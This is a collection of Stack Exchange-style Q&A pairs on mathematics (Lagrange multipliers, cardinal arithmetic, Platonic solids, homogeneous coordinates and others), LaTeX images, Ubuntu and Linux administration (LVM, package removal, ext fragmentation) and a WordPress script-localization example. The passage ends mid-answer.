{"title": "Unsupervised, supervised and semi-supervised learning", "description": "In the context of machine learning, what is the difference between\n\nunsupervised learning\nsupervised learning and\nsemi-supervised learning?\n\nAnd what are some of the main algorithmic approaches to look at?\n", "answer": "Generally, the problems of machine learning may be considered variations on function estimation for classification, prediction or modeling.\nIn supervised learning one is furnished with input ($x_1$, $x_2$, ...,) and output ($y_1$, $y_2$, ...,) and are challenged with finding a function that approximates this behavior in a generalizable fashion.  The output could be a class label (in classification) or a real number (in regression)-- these are the \"supervision\" in supervised learning. \nIn the case of unsupervised learning, in the base case, you receives inputs $x_1$, $x_2$, ..., but neither target outputs, nor rewards from its environment are provided.  Based on the problem (classify, or predict) and your background knowledge of the space sampled, you may use various methods: density estimation (estimating some underlying PDF for prediction), k-means clustering (classifying unlabeled real valued data), k-modes clustering (classifying unlabeled categorical data), etc.\nSemi-supervised learning involves function estimation on labeled and unlabeled data.  This approach is motivated by the fact that labeled data is often costly to generate, whereas unlabeled data is generally not.  The challenge here mostly involves the technical question of how to treat data mixed in this fashion. See this Semi-Supervised Learning Literature Survey for more details on semi-supervised learning methods.\nIn addition to these kinds of learning, there are others, such as reinforcement learning whereby the learning method interacts with its environment by producing actions $a_1$, $a_2$, . . .. that produce rewards or punishments $r_1$, $r_2$, ...\n", "score": 24}
{"title": "The cow in the field problem (intersecting circular areas)", "description": "What length of rope should be used to tie a cow to an exterior fence post of a circular field so that the cow can only graze half of the grass within that field?\nupdated: To be clear: the cow should be tied to a post on the exterior of the field, not a post at the center of the field. \n", "answer": "\nThe field is the smaller/left circle, centered at A.  The cow is tied to the post at E.  The larger/right circle is the grazing radius.  Let the radius of the field be R and the length of the rope be L.\nThe grazable area is the union of a segment of the circular field and a segment of the circle defined by the rope length.  (A segment of a circle is a sector of a circle less the triangle defined by the center of the circle and the endpoints of the arc.)  The area of a segment of a circle of radius $R$ with central angle $t$ is $\\frac{1}{2}R^2(t-\\sin(t))$, where $t$ is measured in radians.\nIn order to express the grazable area in terms of $R$ and one angle, we consider the angles ∠CED and ∠CAD (which define the segments of the circles; call these α and β for convenience) and the triangle CEF. Let $\\theta$ be ∠EFC. $2\\theta$ is an inscribed angle for the central angle $\\beta$ over the same arc, making $\\beta = 4\\theta$. The sum of angles in triangle CEF is $\\theta + \\pi/2 +\\alpha/2=\\pi$ or $\\alpha =\\pi-2\\theta$.\nThe grazable area is $\\frac{1}{2}L^2(\\alpha-\\sin\\alpha)+\\frac{1}{2}R^2(\\beta-\\sin\\beta)=R^2(\\frac{1}{2}(L/R)^2((\\pi-2\\theta)-\\sin(\\pi-2\\theta))+\\frac{1}{2}(4\\theta-\\sin(4\\theta)))$, where $a = CE = L/R=2\\sin(\\theta)$.  We want that to be equal to half the area of the field, $\\frac{1}{2}\\pi R^2$.\nThat is, the equality of areas is $$R^2(2(\\sin(\\theta))^2((\\pi-2\\theta)-\\sin(\\pi-2\\theta))+\\frac{1}{2}(4\\theta-\\sin(4\\theta)))=R^2\\frac{\\pi}{2}$$\nSimplifying: \n$$R^2(\\pi+(2\\theta-\\pi)\\cos(2\\theta)-\\sin(2\\theta)=\\frac{\\pi}{2})$$\n(The grazable area seems to be $\\pi+\\alpha\\cos\\alpha-\\sin\\alpha$; can this be seen easily?)\n\nThe desired equality of areas is obtained for $\\theta = \\text{ca. } 0.618$ or  $L=\\text{ca. }1.159 R$ .\n", "score": 17}
{"title": "What are gradients and how would I use them?", "description": "I keep seeing this symbol $\\nabla$ around and I know enough to understand that it represents the term \"gradient.\" But what is a gradient? When would I want to use one mathematically?\n", "answer": "The ∇ (pronounced \"del\") is an operator, more technically.  In 3D, it (more or less) means the vector\n< df/dx, df/dy, df/dz >\n\nSo, if f(x,y,z) = x^2 + y^3*z + sin(z), ∇f = < 2x, 3y^2*z, y^3 + cos(z) >\nIt's actually a bit more subtle than that; technically it means\n< d/dx, d/dy, d/dz >\n\nAnd when you do ∇f, it's sort of like a \"multiplication\" of ∇ and f;\n< d/dx, d/dy, d/dz > f = < d/dx f, d/dy f, d/dz f >\n\nOnly, not multiplication, but operation.\nThere are some neat properties about the del operator.  Here are a couple:\n\nThe most famous is that ∇f yields the gradient of f.  That is, at any point (x,y,z), ∇f(x,y,z) is the vector pointing in the direction where it is most increasing.  The magnitude of it is the magnitude of the increase.\nThis is easier to understand with, say, a 2D f(x,y).  If f(x,y) represents the height of a point at (x,y), then ∇f(x,y) represents the steepest incline from that point.  Or rather, if you placed a ball on that point, it would start rolling in the opposite direction of the gradient vector.\nNormally, for multi-dimensional functions, it is easiest to find the derivative along an axis (x, y, z, etc.).  With ∇, you can find the derivative along any arbitrary direction by using ∇f * u, where * is the dot product and u is the unit vector along the direction you are calculating.\n∇ is also used to calculate divergence (amount that vectors are \"spreading out\") and curl (amount that vectors are \"curling up\") of a vector field.\nDivergence is ∇ * f (dot product), and curl is ∇ x f (cross product)\nThey aren't truly \"products\" in the sense.  Rather, when you are calculating divergence and curl and you must do d/dx * (something), you are actually doing d/dx (something) or d(something)/dx.\n\n", "score": 11}
{"title": "Why are $3D$ transformation matrices $4 \\times 4$ instead of $3 \\times 3$?", "description": "Background: Many (if not all) of the transformation matrices used in $3D$ computer graphics are $4\\times 4$, including the three values for $x$, $y$ and $z$, plus an additional term which usually has a value of $1$.\nGiven the extra computing effort required to multiply $4\\times 4$ matrices instead of $3\\times 3$ matrices, there must be a substantial benefit to including that extra fourth term, even though $3\\times 3$ matrices should (?) be sufficient to describe points and transformations in 3D space.\nQuestion: Why is the inclusion of a fourth term beneficial? I can guess that it makes the computations easier in some manner, but I would really like to know why that is the case.\n", "answer": "I'm going to copy my answer from Stack Overflow, which also shows why 4-component vectors (and hence 4×4 matrices) are used instead of 3-component ones.\n\nIn most 3D graphics a point is represented by a 4-component vector (x, y, z, w), where w = 1. Usual operations applied on a point include translation, scaling, rotation, reflection, skewing and combination of these. \nThese transformations can be represented by a mathematical object called \"matrix\". A matrix applies on a vector like this:\n[ a b c tx ] [ x ]   [ a*x + b*y + c*z + tx*w ]\n| d e f ty | | y | = | d*x + e*y + f*z + ty*w |\n| g h i tz | | z |   | g*x + h*y + i*z + tz*w |\n[ p q r s  ] [ w ]   [ p*x + q*y + r*z +  s*w ]\n\nFor example, scaling is represented as\n[ 2 . . . ] [ x ]   [ 2x ]\n| . 2 . . | | y | = | 2y |\n| . . 2 . | | z |   | 2z |\n[ . . . 1 ] [ 1 ]   [ 1  ]\n\nand translation as\n[ 1 . . dx ] [ x ]   [ x + dx ]\n| . 1 . dy | | y | = | y + dy |\n| . . 1 dz | | z |   | z + dz |\n[ . . . 1  ] [ 1 ]   [   1    ]\n\nOne of the reason for the 4th component is to make a translation representable by a matrix.\nThe advantage of using a matrix is that multiple transformations can be combined into one via matrix multiplication.\nNow, if the purpose is simply to bring translation on the table, then I'd say (x, y, z, 1) instead of (x, y, z, w) and make the last row of the matrix always [0 0 0 1], as done usually for 2D graphics. In fact, the 4-component vector will be mapped back to the normal 3-vector vector via this formula:\n[ x(3D) ]   [ x / w ]\n| y(3D) ] = | y / w |\n[ z(3D) ]   [ z / w ]\n\nThis is called homogeneous coordinates. Allowing this makes the perspective projection expressible with a matrix too, which can again combine with all other transformations.\nFor example, since objects farther away should be smaller on screen, we transform the 3D coordinates into 2D using formula\nx(2D) = x(3D) / (10 * z(3D))\ny(2D) = y(3D) / (10 * z(3D))\n\nNow if we apply the projection matrix\n[ 1 . .  . ] [ x ]   [  x   ]\n| . 1 .  . | | y | = |  y   |\n| . . 1  . | | z |   |  z   |\n[ . . 10 . ] [ 1 ]   [ 10*z ]\n\nthen the real 3D coordinates would become\nx(3D) := x/w = x/10z\ny(3D) := y/w = y/10z\nz(3D) := z/w = 0.1\n\nso we just need to chop the z-coordinate out to project to 2D.\n", "score": 54}
{"title": "What property of certain regular polygons allows them to be faces of the Platonic Solids?", "description": "It appears to me that only Triangles, Squares, and Pentagons are able to \"tessellate\" (is that the proper word in this context?) to become regular 3D convex polytopes.\nWhat property of those regular polygons themselves allow them to faces of regular convex polyhedron?  Is it something in their angles?  Their number of sides?\nAlso, why are there more Triangle-based Platonic Solids (three) than Square- and Pentagon- based ones? (one each)\nSimilarly, is this the same property that allows certain Platonic Solids to be used as \"faces\" of regular polychoron (4D polytopes)?\n", "answer": "The regular polygons that form the Platonic solids are those for which the measure of the interior angles, say α for convenience, is such that $3\\alpha<2\\pi$ (360°) so that three (or more) of the polygons can be assembled around a vertex of the solid.\nRegular (equilateral) triangles have interior angles of measure $\\frac{\\pi}{3}$ (60°), so they can be assembled 3, 4, or 5 at a vertex ($3\\cdot\\frac{\\pi}{3}<2\\pi$, $4\\cdot\\frac{\\pi}{3}<2\\pi$, $5\\cdot\\frac{\\pi}{3}<2\\pi$), but not 6 ($6\\cdot\\frac{\\pi}{3}=2\\pi$--they tesselate the plane).\nRegular quadrilaterals (squares) have interior angles of measure $\\frac{\\pi}{2}$ (90°), so they can be assembled 3 at a vertex ($3\\cdot\\frac{\\pi}{2}<2\\pi$), but not 4 ($4\\cdot\\frac{\\pi}{2}=2\\pi$--they tesselate the plane).\nRegular pentagons have interior angles of measure $\\frac{3\\pi}{5}$ (108°), so they can be assembled 3 at a vertex ($3\\cdot\\frac{3\\pi}{5}<2\\pi$), but not 4 ($4\\cdot\\frac{3\\pi}{5}>2\\pi$).\nRegular hexagons have interior angles of measure $\\frac{2\\pi}{3}$ (120°), so they cannot be assembled 3 at a vertex ($3\\cdot\\frac{2\\pi}{3}=2\\pi$--they tesselate the plane).\nAny other regular polygon will have larger interior angles, so cannot be assembled into a regular solid.\n", "score": 32}
{"title": "Proving the Riemann Hypothesis without revealing anything other than you proved it", "description": "Consider the following assertion from Scott Aaronson's blog:\n\nSupposing you do prove the Riemann\n  Hypothesis, it’s possible to convince\n  someone of that fact, without\n  revealing anything other than the fact\n  that you proved it. It’s also possible\n  to write the proof down in such a way\n  that someone else could verify it,\n  with very high confidence, having only\n  seen 10 or 20 bits of the proof.\n\nCan anyone explain where this result comes from?\n", "answer": "The correct answer has already been given by Akhil Mathew in the comments above.\nThe topic belongs to the field of complexity theory in computer science. In complexity theory, there exists an intriguing concept for the problem of deciding whether a given word belongs to a given formal language or not: interactive proof systems. These systems model the interaction between resource-limited verifier (say, you or me) and an almighty prover (say, your much, much smarter older sister). The goal of the interaction is that the prover convinces the verifier from the fact that the given word is or is not an element of the language such that:\n\nalmost surely, the verfier can only be convinced from the true answer and\nthe verifier can only be fooled to believe the opposite within a very small margin of error.\n\nThere are a large number of theoretical results with respect to these interactive systems. These resuts include the follwoing two statements (given informally):\n\neverything that can be proven by such an interactive protocoll can also be proven using an interactive protocoll that convinces the verifier (within small margin of error) but it does not reveal any information about the proof itself. (Zero-Knowledge-Proof, \"Everything provable is provable in zero-knowledge\" by Ben-Or et al, 1988)\nevery proof can be rewritten such that inspection of just a constant number of bits from this proof convinces the verifier within only a small margin of error (PCP-Theorem, \"Proof verification and the hardness of approximation problems\" by Arora et al, 1992, and a number of other papers)\n\nBoth of these concepts and results are highly non-trivial and beyond the scope of this forum.\nOf course, in the quote above Scott Aaronson is just using some everyday's problem to illustrate these concepts. To use these results formally, would have to convert the task of \"proving the Riemann Hypothesis\" to a decision problem of formal languages, as is standard in complexity theory.\n\nEDIT: There is in fact a small modification in the model between both results stated above which I omitted. First, the interaction between one prover and the verifier can be generalized to multiple provers and a verifier. Next, there is a result that finds that the case of multiple provers can be equivalently reformulated as follows: The provers are removed from the protocol, rather there is a single (possibly very long) string which acts as a written proof for the word problem. Interaction is now looking at an arbitrarily chosen bit of this proof, and the verifier may choose the location of these bits randomly. This is called a Probabilistic Checkable Proof (hence, PCP). So ,in this scenario, the \"written proof\" of the Riemann Hypothesis would be interpreted as the proof string.\n", "score": 13}
{"title": "Proof of Angle in a Semi-Circle is of $90$ degrees", "description": "There is a well known theorem often stated as the angle in a semi-circle being $90$ degrees. To be more accurate, any triangle with one of its sides being a diameter and all vertices on the circle has its angle opposite the diameter being $90$ degrees. The standard proof uses isosceles triangles and is worth having as an answer, but there is also a much more intuitive proof as well (this proof is more complicated though).\n", "answer": "Nonstandard proof\nConsider the semi-circle with endpoints A and C and center O and the inscribed angle ∠ABC (B on the semi-circle) together with the rotation image of both about O by 180°.  The image of A is C and vice versa; let B' be the image of B.  The image of a line under a 180° rotation is parallel to the original line, AB is parallel to CB' and BC is parallel to B'A, so ABCB' is a parallelogram.  BO and its image must be parallel, but the image of O is itself, since it is the center of rotation, and if BO and B'O are parallel and contain a point in common, they must lie on the same line, so BB' passes through O.  AC and BB' (the diagonals of ABCB') are both diameters of the circle, so they are congruent.  A parallelogram with congruent diagonals is a rectangle.  Thus, ∠ABC is a right angle (and has measure 90°).\ndiagram http://www.imgftw.net/img/762828246.png\nStandard proof (or, at least, my guess at it based on the description in the question)\nAs above, consider the semi-circle with endpoints A and C and center O and the inscribed angle ∠ABC (B on the semi-circle).  Draw in radius OB.  OA = OB, so △AOB is isosceles and ∠OAB≅∠OBA.  OB = OC, so △BOC is isosceles and ∠OBC≅∠OCB.  Let α=m∠OAB=m∠OBA and β=m∠OBC=m∠OCB.  In \n△ABC, the measures of the angles are α, α+β, and β, so α+(α+β)+β=180° or 2(α+β)=180° or α+β=90°, so ∠ABC has measure 90° and is a right angle.\ndiagram http://www.imgftw.net/img/319527897.png\nedit: Another Nonstandard proof\nUse the labeling as above and apply Stewart's Theorem to △ABC: $$(AB)^2(OC) + (BC)^2(AO) = (AC)((BO)^2 + (AO)(OC))$$  Substituting the length r of the radius of the semicircle as appropriate: $$(AB)^2r + (BC)^2r = 2r(r^2 + r^2)=4r^3$$  Dividing both sides by r: $$(AB)^2+(BC)^2=(2r)^2=(AC)^2$$\nSo, by the converse of the Pythagorean Theorem, ∠ABC is a right angle.\n", "score": 14}
{"title": "How do Lagrange multipliers work to find the lowest value of a function subject to a constraint?", "description": "I have been using Lagrange multipliers in constrained optimization problems, but I don't see how they actually work to simultaneously satisfy the constraint and find the lowest possible value of an objective function.\n", "answer": "This type of problem is generally referred to as constrained optimization.  A general technique to solve many of these types of problems is known as the method of Lagrange multipliers, here is an example of such a problem using Lagrange multipliers and a short justification as to why the technique works.\nConsider the parabaloid given by $f(x,y) = x^2 + y^2$.  The global minimum of this surface lies at the origin (at $x=0$, $y=0$).  If we are given the constraint, a requirement on the relationship between $x$ and $y$, that $3x+y=6$, then the origin can no longer be our solution (since $3\\cdot 0 + 1 \\cdot 0 \\neq 6$).  Yet, there is a lowest point on this function satisfying the given constraint. \nWhat we have so far:\nObjective function: $f(x,y) = x^2 + y^2$, \nsubject to: $3x+y=6$.\nFrom here we can derive the Lagrange formulation of our constrained minimization problem.  This will be a function $L$ of $x$, $y$, and a single Lagrange multiplier $\\lambda$ (since we have only a single constraint). It will be this new function that we minimize.\n$L(x,y,\\lambda) = x^2 + y^2 + \\lambda(3x+y-6)$\nThe Lagrange formulation incorporates our original function along with our constraint(s).  On the way toward minimizing $L$, we will have to minimize the objective function $x^2 + y^2$, as well as minimize the contribution from the constraint, which is now weighted by a factor of $\\lambda$.  If the constraint is met, then the expression $3x+y-6$ will necessarily be zero, and will not contribute anything the value of $L$. This is the trick of the technique.\nMinimizing the Lagrange formulation:\nTo minimize $L$ we simply find the $x,y$, and $\\lambda$ values that make its gradient zero.  (This is exactly analogous to setting the first derivative to zero in calculus.)  \n$\\nabla L = 0:$\n$\\frac{\\partial L}{\\partial x} = 2x + 3 \\lambda = 0$\n$\\frac{\\partial L}{\\partial y} = 2y + \\lambda = 0$\n$\\frac{\\partial L}{\\partial \\lambda} = 3x + y - 6 = 0$,\nIn our example we have arrived at a system of simultaneous linear equations which can (and should) be solved with matrix algebra.  The solution will be a vector holding values for $x, y$ and $\\lambda$.  The lowest value of the objective function, subject to the given constraint, sits at $(x,y,f(x,y))$, and the Lagrange multiplier does not have an immediate physical interpretation.  (The multipliers have meaning when appearing in certain contexts, more info on that here.)\n", "score": 25}
{"title": "square root of symmetric matrix and transposition", "description": "I have a symmetric matrix A. How do I compute a matrix B such that $B^tB=A$ where $B^t$ is the transpose of $B$. I cannot figure out if this is at all related to the square root of $A$. \nI've gone through wikimedia links of square root of a matrix.\n", "answer": "As J. M. says, you need your matrix $A$ to be positive definite. Since $A$, being symmetric, is always diagonalizable, this is the same as saying that it has non-negative eigenvalues. If this is the case, you can adapt alex's comment almost literally for the real case: as we've said, $A$ is diagonalizable, but, also, there exists an orthonormal base of eigenvectors of $A$. That is, there is an invertible matrix $S$ and a diagonal matrix $D$ such that\n$$\r\nD = SAS^t , \\quad \\text{with} \\quad SS^t = I \\ .\r\n$$\nSince \n$$\r\nD = \\mathrm{diag} (\\lambda_1, \\lambda_2, \\dots , \\lambda_n) \\ ,\r\n$$ \nis a diagonal matrix and has only non-negative eigenvalues $\\lambda_i$, you can take its square root\n$$\r\n\\sqrt{D} = \\mathrm{diag} (\\sqrt{\\lambda_1}, \\sqrt{\\lambda_2}, \\dots , \\sqrt{\\lambda_n} ) \\ ,\r\n$$\nand then, on one hand, you have:\n$$\r\n\\left( S^t \\sqrt{D} S   \\right)^2 = \\left( S^t \\sqrt{D} S\\right) \\left(S^t \\sqrt{D} S \\right) = S^t \\left( \\sqrt{D}\\right)^2 S = S^t D S = A \\ .\r\n$$\nOn the other hand, $S^t \\sqrt{D} S$ is a symmetric matrix too:\n$$\r\n\\left( S^t \\sqrt{D} S   \\right)^t = S^t (\\sqrt{D})^t S^{tt} = S^t \\sqrt{D^t} S = S^t \\sqrt{D} S  \\ ,\r\n$$\nso you have your $B = S^t \\sqrt{D} S$ such that $B^t B = A$.\n", "score": 17}
{"title": "Category of sets", "description": "Let C be a category of sets, which has objects all sets and arrows all functions, with usual identity functions and the usual composition of functions. For any set S, the assignment s-s for all s in S describes the identity function. If S is a subset of Y, the assignment also describes the inclusion function from S to Y. These functions are different unless S is equal to Y. My question is why these functions are different since they have the same domain and assignment.\n", "answer": "In Categories, we have two operations called Domain and Codomain from the collection of all arrows to the collection of all objects. Each arrow $f$ belongs to the collection $C(\\mathrm{dom}f,\\mathrm{codom} f)$. \nSo in the Category of Sets, we actually are interested not just in the domain and the assignment of each function (which is what the arrows are), but also in the codomain. That is, you want to think of a function in the category $\\mathcal{S}et$ as a triple, consisting of the domain, the codomain, and the actual set of pairs that make up the function (the assignment), $(A,B,f)$ for a function $f\\colon A\\to B$. Then the operator Domain will just give you the first component, $A$; the operator Codomain will give you the second component $B$. \nHere, two functions are equal if and only if they have the same domain, the same assignment, and the same codomain. The codomain is important because it is an important attribute of arrows in categories. \nSo the inclusion function from $S$ to $Y$ has domain $S$, codomain $Y$, and rule $s\\mapsto s$. The identity function from $S$ to itself has domain $S$, codomain $S$, and rule $s\\mapsto s$. So the first function corresponds to\n$$\\Bigl(S, Y, \\{(s,s)\\in S\\times S\\}\\Bigr)$$\r\nwhile the second function is\n$$\\Bigl(S,S,\\{(s,s)\\in S\\times S\\}\\Bigr).$$\r\nIf the two arrows are equal, then the value of Domain and of Codomain must be the same in both; that is, we must have $S=Y$. And of course, if $S=Y$, then they are the same function.\n", "score": 10}
{"title": "What's the cardinality of all sequences with coefficients in an infinite set?", "description": "My motivation for asking this question is that a classmate of mine asked me some kind of question that made me think of this one. I can't recall his exact question because he is kind of messy (both when talking about math and when thinking about math). \nI'm kind of stuck though. I feel like the set $A^{\\mathbb{N}} = \\{f: \\mathbb{N} \\rightarrow A, f \\text{ is a function} \\}$ should have the same cardinality as the power set of A, if A is infinite. On the other hand, in this post, it is stated that the sequences with real coefficients have the same cardinality as the reals. \nIt's easy to see that $A^{\\mathbb{N}} \\subseteq P(A)$, but (obviously) I got stuck on the other inclusion. Is there any general result that says anything else? References would be appreciated.\nEDIT To clarify the intetion of this question: I want to know if there are any general results on the cardinality of $A^{\\mathbb{N}}$ other that it is strictly less than that of the power set of A. \nAlso, I was aware that the other inclusion isn't true in general (as the post on here I linked to gave a counterexample), but thanks for pointing out why too. :)\n", "answer": "From Jech's Set Theory, we have the following theorems on cardinal exponentiation (a Corollary on page 49):\nTheorem. For all $\\alpha,\\beta$, the value of $\\aleph_{\\alpha}^{\\aleph_{\\beta}}$  is always either:\n\n$2^{\\aleph_{\\beta}}$; or\n$\\aleph_{\\alpha}$; or\n$\\aleph_{\\gamma}^{\\mathrm{cf}\\;\\aleph_{\\gamma}}$ for some $\\gamma\\leq\\alpha$ where $\\aleph_{\\gamma}$ is such that $\\mathrm{cf}\\;\\aleph_{\\gamma}\\leq\\aleph_{\\beta}\\lt\\aleph_{\\gamma}$.\n\nHere, $\\mathrm{cf}\\;\\aleph_{\\gamma}$ is the cofinality of $\\aleph_{\\gamma}$: the cofinality of a cardinal $\\kappa$ (or of any limit ordinal) is the least limit ordinal $\\delta$ such that there is an increasing $\\delta$-sequence $\\langle \\alpha_{\\zeta}\\mid \\zeta\\lt\\delta\\rangle$ with $\\lim\\limits_{\\zeta\\to\\delta} = \\kappa$. The cofinality is always a cardinal, so it makes sense to understand the operations above as cardinal operations.\nCorollary. If the Generalized Continuum Hypothesis holds, then\n$$\\aleph_{\\alpha}^{\\aleph_{\\beta}} = \\left\\{\\begin{array}{lcl}\n\\aleph_{\\alpha} &\\quad & \\mbox{if $\\aleph_{\\beta}\\lt\\mathrm{cf}\\;\\aleph_{\\alpha}$;}\\\\\n\\aleph_{\\alpha+1} &&\\mbox{if $\\mathrm{cf}\\;\\aleph_{\\alpha}\\leq\\aleph_{\\beta}\\leq\\aleph_{\\alpha}$;}\\\\\n\\aleph_{\\beta+1} &&\\mbox{if $\\aleph_{\\alpha}\\leq\\aleph_{\\beta}$.}\n\\end{array}\\right.$$\nSo, under GCH, for all cardinals $\\kappa$ with cofinality greater than $\\aleph_0$ have $\\kappa^{\\aleph_0} = \\kappa$, and for cardinals $\\kappa$ with cofinality $\\aleph_0$ (e.g., $\\aleph_0$, $\\aleph_{\\omega}$), we have $\\kappa^{\\aleph_0} = 2^{\\kappa}$. (In particular, it is not the case the cardinality of $A^{\\mathbb{N}}$ is necessarily less than the cardinality of $\\mathcal{P}(A)$).\nThen again, GCH is usually considered \"boring\" by set theorists, from what I understand. \n", "score": 15}
{"title": "How do I insert an image in LaTeX so it looks good on print?", "description": "LaTeX documents print beautifully, but images often looks \"ugly\", \"pixelated\" or \"low-res\" compared to the text. By images I don't mean photos, which I rarely use, but rather diagrams, charts and drawings made in other programs such as Visio, Excel and Photoshop. I would love for these to look just as good as the rest of the report when printed.\n", "answer": "Vector Imagery\n\nIf you can, save diagrams as a vector-based format such as PDF or EPS- these formats can be readily included in LaTeX documents and scale without appearing pixelized.  Note that PDF should be used for input to pdflatex and EPS should be used with plain latex.\nInkscape is an excellent, free, cross-platform program for creating and editing vector graphics- similar to Adobe Illustrator.  There is even a project that is producing a plug-in for Inkscape that allows Inkscape graphics to be exported to TikZ.\nTikZ is a TeX-based language for creating vector graphics- it is incredibly expressive and lets you create graphics right inside your TeX document.  However, using TikZ requires writing out the commands required to create an image- it is not a GUI-based drawing program.\nIf you are using latex instead of pdflatex, then the PSTricks package is also available- but your document must be rendered into PostScript somewhere along the for the images to appear.  However, passing through PostScript has advantages- PostScript is a complete programming language for creating graphics which PSTricks is able to leverage in order to produce some effects that are difficult/impossible to replicate using TikZ.\nRaster Imagery\n\nIf all you have is a raster image, PNG, JPEG, GIF, TIFF, ect, then you must pay close attention to the resolution that the image file has been saved at.  The resolution will determine how much scaling can occur before the image starts to appear pixelated.\nMany programs default to saving images at 72 dpi (dots per inch) as that is a lightweight resolution that is commonly used for images displayed on the web.  However, for printed output you need a much higher resolution for the results to look good.  A common rule of thumb is that the final scaled image should have a resolution of at least 300 dpi if it is to appear on a printed page without noticeable pixelation. \n", "score": 52}
{"title": "How do I check / modify LVM state on a pre-installed system?", "description": "So I just got a nice little home server (not 100% a server, it's also destined to run a few GUI jobs, but, mostly) configured to my specs, and it came with Ubuntu 10.4 pre-installed by the guys who put it together (who aren't Ubuntu specialists, but do that for customers who don't want to purchase Windows).\nNow, I'd like to check (and perhaps modify) exactly how they installed it (maybe it would be wiser to reinstall from scratch, but first I'd like to understand exactly how it's configured now, anyway).\nIn particular, how do I check if and how LVM is installed/configured?  I'd prefer a command-line approach, but GUIs are fine too -- and pointers to docs and tutorials on the subject are welcome too.\n", "answer": "LVM is a pretty complex system and requires some knowledge before you can fully start to inspect the state. There are quite a few howtos lying around on the subject, but here is a crash course:\nFirst of all, LVM is structured so that you pool physical partitions or volumes in to groups that then get split to logical volumes that are used by the operating system. All of these can be inspected with their own set of tools. Physical partitions (or volumes) can be inspected and modified with the pv* tools. Volume groups are inspected and modified with the vg* tools and finally the actual volumes that are used as filesystems can be inspected with lv* toolset.\nHere is a good example on LVM structure\nFor inspecting the state of LVM you can use lvs, vgs or pvs commands. This will allow you to see how much space is used and where that space is allocated.\nYou can alter the size of logical volumes with the lvresize command, but be very careful when doing so. The LVM doesn't allow data to be stored outside of the logical volume like regular partitions. So if you shrink a partition by mistake and make it smaller than the filesystem, you will loose the data outside of the partition. Also when you resize a partition you need to resize the filesystem too, it is not automatically resized.\nFinally, here is a full LVM HOWTO covering the bits I've left out here.\nLVM is really powerful and useful. Once you get to know it, you don't really want to use anything else.\n", "score": 11}
{"title": "How do I remove an application?", "description": "How do I remove an app (Tonido) in Ubuntu?\n", "answer": "Ubuntu offers several ways to remove an application. For all further explanations I assume that you installed some Ubuntu package. So the explanation is not valid if you installed software via ./configure && make && make install or used some kind of app specific setup wizard.\nSoftware-Center\nUbuntus Software-Center (Applications --> Software-Center) lists software which is currently installed on your computer. You can use the search box to look for a specific application. Click on the application you wish to remove and click on the Remove-button.\nSynaptic\nAnother way to remove software is by using Synaptic. Click on System -> Administration -> Synaptic. A new window open and you can enter some search term into the box. So you will narrow down the list of software. After you found the software to remove right-click on the package and select Mark for Removal. Then apply the changes. Synaptic will show you a window with the changes it wants to make and if you apply the software will be removed.\nAptitude\nAptitude is a text-mode software. You will need to open a terminal and enter sudo aptitude. Aptitude shows you a textual interface. You can search for your software by typing a slash (/) and entering some part of the name. If the software doesn't show the software in the first place (some packages have similar names) click n. If you find the package you want to remove enter -. After you found all your software enter g. Aptitude will show you all software it wants to remove. If all is correct enter g again and the software will be removed.\nAptitude can also be used via commandline. If you know the exact name of the software type:\naptitude remove packagename\n\nYou can also use aptitude purge packagename. Aptitude will then remove anything which is related to the software (config files, database files etc.)\napt-get\napt-get is a full command line program. If you want to remove software enter:\napt-get remove packagename\n\nYou can also use purge as in aptitude.\n", "score": 11}
{"title": "Defragging an ext partition?", "description": "Why don't ext2/3/4 need to be defragmented? Is there no fragmentation at all?\n", "answer": "Modern filesystems, particularly those designed to be efficient in multi-user and/or multi-tasking use cases, do a good fairly job of not fragmenting data until filesystems become near to full (there is no exact figure for where the \"near to full\" mark is as it depends on how large the filesystem is, the distribution of file sizes and what your access patterns are - figures between 85% and 95% are commonly quoted) or the pattern of file creations and writes is unusual or the filesystem is very old so has seen a lot of \"action\". This includes ext2/3/4, reiser, btrfs, NTFS, ZFS, and others.\nThere is currently no kernel-/filesystem- level way to defragment ext3 or 4 at the moment (see http://en.wikipedia.org/wiki/Ext3#Defragmentation for a little more info) though ext4 is planned to soon gain online defragmentation.\nThere are user-land tools (such as http://vleu.net/shake/ and others listed in that wikipedia article) that try defragment individual files or sets of files by copying/rewriting them - if there is a large enough block of free space this generally results in the file being given a contiguous block. This in no way guarantees files are near each other though so if you run shake over a pair of large files you migth find is results in the two files being defragmented themselves but not anywhere near each other on the disk. In a multi-user filesystem the locality of files to each other isn't often important (it is certainly less important then fragmentation of the files themselves) as the drive heads are flipping all over the place to serve different user's needs anyway and this drowns out the latency bonus that locality of reference between otherwise unfragmented files would give but on a mostly single user system it can give measurable benefits.\nIf you have a filesystem that has become badly fragmented over time and currently has a fair amount of free space then running something like shake over all its files could have the effet you are looking for. Another method would be to copy all the data to a new filesystem, remove the original, and then copy it back on again. This helps in much the same way shake does but may be quicker for larger amounts of data.\nFor small amounts of fragmentation, just don't worry about it. I know people who spend more time sat watching defragmentation progress bars than they'll ever save (due to more efficient disk access) in several lifetimes of normal operation!\n", "score": 10}
{"title": "Modifying a JS file with data from plugin settings", "description": "I have a plugin that, among other things, has a javascript file that requires a few user specific settings. What would be the best way to get those settings into javascript from the plugin's settings parameters?\nIn other words, if I make those settings part of the settings page where the user can enter them, how would I best be able to get those values into javascript? Would I have to use something to append some script tags and set them via PHP on every page load? Would setting a cookie be a better way to do this?\n", "answer": "better is, you use the functions of WP for this, a example for multilanguage:\n    add_action( 'admin_enqueue_scripts', 'add_scripts' );\n    function add_scripts($where) {\n        wp_localize_script( 'post2media', 'post2media_strings', $this->localize_vars() );\n    }\n    function localize_vars() {\n\n        $strings = array(\n                'btntext'    => __( 'Link with post', INPSYDE_P2M_TEXTDOMAIN ),\n                'txtallnone' => __( 'Include in gallery:', INPSYDE_P2M_TEXTDOMAIN ),\n                'txtall'     => __( 'All', INPSYDE_P2M_TEXTDOMAIN ),\n                'txtnone'    => __( 'None', INPSYDE_P2M_TEXTDOMAIN ),\n                'ttlcb'      => __( 'Include image in this gallery', INPSYDE_P2M_TEXTDOMAIN )\n            );\n\n        return $strings;\n    }\n\nuse this in js-file:\njQuery(function ($) {\nbuttonaddfunc = function() {\n    btntext = post2media_strings.btntext;\n\n    reg = /\\d+/;\n    $( '.savesend > .button' ) . each( function() {\n        inputname = $( this ) . attr( 'name' );\n        number = reg . exec( inputname );\n        $( this ) . after( '<input type=\"submit\" value=\"' + btntext + '\" name=\"link[' + number + ']\" class=\"button\">' );\n    } );\n    $( '.describe-toggle-on' ).unbind( 'click', buttonaddfunc );\n};\n$( '.describe-toggle-on' ).bind( 'click', buttonaddfunc );\n\n} );\nAlso see the post from 